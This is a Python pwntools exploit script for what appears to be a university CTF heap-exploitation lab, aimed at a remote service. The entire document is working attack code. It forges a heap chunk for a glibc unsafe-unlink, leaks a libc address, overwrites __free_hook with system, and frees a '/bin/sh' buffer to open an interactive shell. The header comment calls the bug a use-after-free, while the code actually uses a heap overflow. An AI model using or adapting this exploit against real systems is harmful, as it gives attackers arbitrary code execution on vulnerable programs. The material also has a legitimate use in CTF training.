from pwn import *
from time import *
from termcolor import *
# hole: UAF, use after free




def alloc(size,data):
	r.sendafter('> ','1')
	r.sendafter('size: ',str(size))
	r.sendafter('content: ',str(data))

def get(idx):
	r.sendafter('> ','2')
	r.sendafter('index: ',str(idx))
	return r.recvline()[:-1]

def edit(idx,length,data):
	r.sendafter('> ','3')
	r.sendafter('index: ',str(idx))
	r.sendafter('length: ',str(length))
	r.sendafter('content: ',str(data))
	return r.recvline()[:-1]

def delete(idx):
	r.sendafter('> ','4')
	r.sendafter('index: ',str(idx))
context.arch = 'amd64'
# r = process('./lab-2')

r = remote('csie.ctf.tw',10134)
# raw_input('wait')

alloc(0x108, 'a')
alloc(0x108, 'a')
alloc(0x108, b'/bin/sh\x00')

'''
0x602040 <note>:	0x0000000000603010	0x0000000000000000
0x602050 <note+16>:	0x0000000000000000	0x0000000000000000
0x602060 <note+32>:	0x0000000000000000	0x0000000000000000

global_pointer point to 0x603010
where we can write 0x603000 (by ida)
'''
p0_address = 0x602040
fake_bin =  \
	p64(0) + p64(0x101) + \
	p64(p0_address - 0x18) + p64(p0_address - 0x10)

	# prev_data/size | size(0x110-0x10) + prev in use
	# p-0x18 | p-0x10

'''
by slide:
	set:
		FD = p->fd = &p - 0x18
		BK = p->bk = &p - 0x10
	result:
		p = &p - 0x18	
'''

fake_bin = fake_bin.ljust(0x100,'\x00') + \
	p64(0x100) + p64(0x110)
	# prev_size = 0x100 | next_size = 0x110 + **fake-prev-in-used**

edit(0,0x200,fake_bin)

# invoke unsafe unlink
delete(1)

# now, p = 0x602040 - 0x18 = 0x602028

'''
0x602010:	0x0000000000000000	0x0000000000000000
0x602020 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dd2620	0x0000000000000000
0x602030 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dd18e0	0x0000000000000000
0x602040 <note>:	0x0000000000000000	0x0000000000000000

now, we have chance to leak stdin's value.
'''

# To print stdin, edit 0x602028->0x602030 to printable char
edit(0,0x8,'|'*8)

# write | *27 to fake_bin_address.

#  354: 00000000003c38e0   224 OBJECT  GLOBAL DEFAULT   33 _IO_2_1_stdin_@@GLIBC_2.2.5
# 1088: 00000000003c3b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook@@GLIBC_2.2.5	
#   214: 00000000003c57a8     8 OBJECT  WEAK   DEFAULT   34 __free_hook@@GLIBC_2.2.5
#   1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

stdin_offset = 0x3c38e0 
system_offset = 0x45390
free_hook_offset = 0x3c57a8

stdin = u64(get(0).split('|')[-1].ljust(8,'\x00')) 
libc_base = stdin - stdin_offset
print(colored(('{: <10s}: %x' %libc_base).format('libc_base'),'red'))
__free_hook = libc_base + free_hook_offset


# trash | stdin (we don't want it crash.) | trash | !!!where store p!!!
edit(0,0x100,p64(0) + p64(stdin) + p64(0) + p64(__free_hook))



edit(0,0x100,p64(system_offset+libc_base))
delete(2)
# we free a buffer, and next we call free_hook.
# free(buf) -> sys(buf), args is match!
r.interactive()
